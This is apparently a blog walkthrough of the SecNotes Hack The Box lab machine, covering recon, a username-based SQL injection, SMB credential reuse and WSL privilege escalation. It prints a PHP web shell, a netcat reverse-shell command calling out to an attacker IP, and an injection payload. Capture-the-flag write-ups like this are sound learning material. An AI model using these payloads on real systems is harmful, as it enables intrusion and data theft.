---
title: "SecNotes Walkthrough(HTB)"
date: 2025-03-22
draft: true 
description: "A straight forward walkthrough of the box SecNotes"
tags: ["Medium", "Windows", "HTB", "hacking", "Active Directory", "Walkthrough"]
---
## Reconnaissance & Enumeration

- As usual I started with a Nmap scan, as for the interesting ones we got port 445 and 80, 8808 open
![Pasted image 20241212212636.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212212636.png?raw=true)
- Web port for an Active Directory seems interesting so I quickly checked the port `80` and we got a login page Also with an option to signup for creating new account.
- This website offeres notes saving feature for it's users.
- For starters I registered an account and logged in.
- After a while I started enumerating. Then I noticed something, its getting the notes listed by using the username and also displays the username on the page. Seems good isn't it.
![Great](https://media1.tenor.com/m/JWc2xV5Y1QcAAAAC/dance.gif)

## Exploitation

### Testing SQL Injection
- After seeing this, the idea of sql Injection suddenly sparked within my brain. As this lists notes for the site merely using username is bad cause a simple valid SQL injection payload might make the backend to list all the notes on the server it includes notes of all users.
- If you haven't heard of SQL injection and if it's new to you I already have a short post on SQL injections for begginers. Please check it {{< article link="/Secure-The-Throne/posts/1741343014156-sql-injection/" >}}
- I started the attack, First I tried `'or 1=1 -- -` on the login page it didn't worked so, the idea here is to create an account with this as the username `'or 1=1 -- -`. I created an account with the username of `'or 1=1 -- -` and it was a success. There is no validation for usernames, Actually in my opinion validation on everything is a requirement.
![validation](https://media1.tenor.com/m/MyQOyO7vDNcAAAAC/thats-very-important-raashi-khanna.gif)
- With the malicious username now I can view everyone's notes
![Pasted image 20241212212438.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212212438.png?raw=true)
- I searched through all the notes and from one of the notes I got a password and username for SMB share.
![creds](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212212838.png?raw=true)
### Accessing the SMB share
- Quickly after enumerating the shares I logged into a share called `new-site` cause it seemed interesting, `new-site` share seems like a share for a web directory which could be this directory or the share for web port `8808`. But
![share](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212213135.png?raw=true)
- At this point i'm 100% positive that this share is for the site hosted on web port `8808`. I could easily upload a reverse shell and trigger it by going to the path as this is a web port.
- Wasted literally two hours cause web shells were not working, then after that restarted the machine and got one worked.

### Shell
- I Created a file with this code and named it `cd.php`.
```php
<?php system($_GET['cmd']); ?>
```
- This above payload will enable command execution on the system.
- After uploading it via SMB and I executed/Triggered or tested the shell by visiting this `http://secnotes.htb:8808/cd.php?cmd=whoami` with a command value of `whoami`.
- Got a response, then to get a stable reverse shell connection I uploaded `nc.exe` into the smb share and accessed it `http://10.10.10.97:8808/tester.php?cmd=nc.exe+-e+cmd.exe+10.10.14.5+6001`
- This is the command
```cmd
nc.exe -e cmd.exe <IP> <PORT>
```
- I got a shell back 
- Eventually got {{< keyword >}} User flag {{< /keyword >}}
![Pasted image 20241212225123.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212225123.png?raw=true)

## Privilege Escalation
- I started my post exploitaion enumeration and while at that I found some interesting files within the `C:\\` directory
![Pasted image 20241212225342.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212225342.png?raw=true)
![interesting](https://media1.tenor.com/m/NQgKo4V-sREAAAAC/interesting-batman.gif)
- Root directory of systems with WSL installed would have directories similar to this and the `Ubuntu.zip` Indicating that this system has WSL installed.
- Typically WSL run as root/administrator. If I could excute the `bash` I could escalate my privilege. 
- To My undertstanding there should a system link file of `bash` as `bash.exe`. So to exploit this we can search for `bash.exe` file
```bash
where /R c:\ bash.exe  
```
### Pivoting
- I got the path and after executing `bash.exe` I got root access easily on the wsl.
![Pasted image 20241212230506.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212230506.png?raw=true)
- Moments after stablizing the shell using `python3 -c 'import pty;pty.spawn("/bin/bash")'`, I enumerated and read the history of the commands in the terminal and there I could see administrator password for a share.
![Pasted image 20241212230916.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212230916.png?raw=true)
- Now I logged in to the share using the administrator's password.
```bash
smbclient -U 'administrator%password' \\\\10.10.10.97\\c$
```
- Downloaded the root.txt file using `get` command
![Pasted image 20241212231856.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212231856.png?raw=true)
- Acquired {{< keyword >}} Root flag {{< /keyword >}} 
![Pasted image 20241212231934.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241212231934.png?raw=true)

{{< typeit >}} This is it, this was a good and useful journey. I learnt a lot from this box. Anyway i'll see you soon {{< /typeit >}}
![bye](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExdXYxZ2syaHUwbWoxNXRtZjEwOWUzbWhybWxzMWkyZzB1ZG42cXV1MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l378d3GlBpg4uHXr2/giphy.gif)
